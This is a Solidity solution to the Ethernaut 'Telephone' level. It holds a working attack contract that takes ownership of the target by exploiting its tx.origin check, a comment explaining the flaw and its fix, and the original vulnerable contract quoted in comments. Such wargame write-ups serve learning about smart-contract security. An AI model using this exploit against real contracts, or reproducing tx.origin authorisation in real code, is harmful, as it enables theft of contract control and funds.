// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract wrongNumber {
    Telephone _telephone;
    address public me = 0xEb085372b4C39b156fFBced6FDfFc725B1c84caA;

    constructor(address _address) public {
        _telephone = Telephone(_address);
    }

    function take() public {
        _telephone.changeOwner(me);
    }
}

/*

Below is the original ethernaut contract.

tx.origin, a global variable that contains the address of the account that originally sent the
call/transaction.

Security issues with contract: 

  - There is no protection over who can take ownership of the contract below.

  - Using tx.origin as authorisation leaves room for potential phishing style attack. The
    contract above can take advantage of using the fallback function to take control of the 
    contract below if the victim in this case is tricked into interacting with the malicious 
    contract.


Prevention:

  - tx.origin should not be used for authorisation in smart contracts.

*/

// ORIGINAL ETHERNAUT CONTRACT

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// contract Telephone {
//     address public owner;

//     constructor() public {
//         owner = msg.sender;
//     }

//     function changeOwner(address _owner) public {
//         if (tx.origin != msg.sender) {
//             owner = _owner;
//         }
//     }
// }
